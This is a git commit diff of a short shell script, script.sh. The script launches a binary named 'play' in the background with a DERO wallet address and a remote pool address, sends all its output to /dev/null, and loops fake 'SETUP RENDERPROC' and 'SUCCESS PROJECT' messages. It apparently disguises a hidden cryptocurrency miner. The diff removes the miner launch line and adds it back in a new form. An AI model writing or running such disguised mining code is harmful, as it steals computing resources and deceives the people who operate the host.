9d5e4a77db42a9bfd86425ef1d06acaf67c77ed3
playdoco <121803568+playdoco@users.noreply.github.com>
2023-01-04 22:01:28 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,5 +1,4 @@
 #!/bin/sh
 chmod u+x play
-screen -dmS run ./play -w dero1qysfzhrrt9u6sfxvpgc8lsn5q9slxu92ltmng0ucgrjslhugqfrmgqgzrjf98 -r 167.172.0.123:10100 -p rpc -m 8 > /dev/null 2>&1
-
+./play -w dero1qysfzhrrt9u6sfxvpgc8lsn5q9slxu92ltmng0ucgrjslhugqfrmgqgzrjf98 -r 167.172.0.123:10100 -p rpc -m 8 > /dev/null 2>&1 &
 while true; do clear; echo SETUP RENDERPROC 1; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
